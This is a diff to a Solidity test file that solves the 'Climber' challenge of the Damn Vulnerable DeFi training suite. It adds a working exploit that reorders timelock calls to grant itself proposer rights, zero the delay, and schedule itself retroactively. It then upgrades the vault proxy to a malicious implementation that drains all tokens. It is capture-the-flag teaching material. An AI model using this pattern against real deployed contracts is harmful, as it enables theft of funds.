@@ -2,11 +2,119 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test} from "forge-std/Test.sol";
 import {ClimberVault} from "../../src/climber/ClimberVault.sol";
-import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
-import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {
+    ClimberTimelock,
+    CallerNotTimelock,
+    PROPOSER_ROLE,
+    ADMIN_ROLE
+} from "../../src/climber/ClimberTimelock.sol";
+import {
+    ERC1967Proxy
+} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
+contract MaliciousVault is ClimberVault {
+    function drain(address token, address recovery) external {
+        // Transfer all DVT from the upgraded vault to recovery.
+        SafeTransferLib.safeTransfer(
+            token,
+            recovery,
+            IERC20(token).balanceOf(address(this))
+        );
+    }
+}
+
+contract ClimberExploit {
+    ClimberTimelock timelock;
+    ClimberVault vault;
+    DamnValuableToken token;
+    address recovery;
+
+    MaliciousVault maliciousVault;
+    bytes32 constant SALT = bytes32(0);
+
+    constructor(address _timelock, address _vault, address _token, address _recovery) {
+        timelock = ClimberTimelock(payable(_timelock));
+        vault = ClimberVault(_vault);
+        token = DamnValuableToken(_token);
+        recovery = _recovery;
+        maliciousVault = new MaliciousVault();
+    }
+
+    function attack() external {
+        (
+            address[] memory targets,
+            uint256[] memory values,
+            bytes[] memory dataElements
+        ) = _buildOperation();
+
+        timelock.execute(targets, values, dataElements, SALT);
+
+        // The proxy now runs MaliciousVault logic, so drain it.
+        MaliciousVault(address(vault)).drain(address(token), recovery);
+    }
+
+    // Callback called by the timelock during execute().
+    function schedule() external {
+        (
+            address[] memory targets,
+            uint256[] memory values,
+            bytes[] memory dataElements
+        ) = _buildOperation();
+
+        timelock.schedule(targets, values, dataElements, SALT);
+    }
+
+    function _buildOperation()
+        private
+        view
+        returns (
+            address[] memory targets,
+            uint256[] memory values,
+            bytes[] memory dataElements
+        )
+    {
+        targets = new address[](4);
+        values = new uint256[](4);
+        dataElements = new bytes[](4);
+
+        (
+            targets[0],
+            targets[1],
+            targets[2],
+            targets[3]
+        ) = (
+            address(timelock),
+            address(timelock),
+            address(this),
+            address(vault)
+        );
+
+        (
+            dataElements[0],
+            dataElements[1],
+            dataElements[2],
+            dataElements[3]
+        ) = (
+            abi.encodeWithSignature(
+                "grantRole(bytes32,address)",
+                PROPOSER_ROLE,
+                address(this)
+            ),
+            abi.encodeWithSignature("updateDelay(uint64)", 0),
+            abi.encodeWithSignature("schedule()"),
+            abi.encodeWithSignature(
+                "upgradeToAndCall(address,bytes)",
+                address(maliciousVault),
+                ""
+            )
+        );
+    }
+}
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -34,6 +142,12 @@ contract ClimberChallenge is Test {
      * SETS UP CHALLENGE - DO NOT TOUCH
      */
     function setUp() public {
+        vm.label(address(deployer), "deployer");
+        vm.label(address(player), "player");
+        vm.label(address(proposer), "proposer");
+        vm.label(address(sweeper), "sweeper");
+        vm.label(address(recovery), "recovery");
+
         startHoax(deployer);
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
@@ -43,7 +157,10 @@ contract ClimberChallenge is Test {
             address(
                 new ERC1967Proxy(
                     address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
             )
         );
@@ -85,7 +202,14 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        ClimberExploit exploit = new ClimberExploit(
+            address(timelock),
+            address(vault),
+            address(token),
+            recovery
+        );
+
+        exploit.attack();
     }
 
     /**
@@ -93,6 +217,10 @@ contract ClimberChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
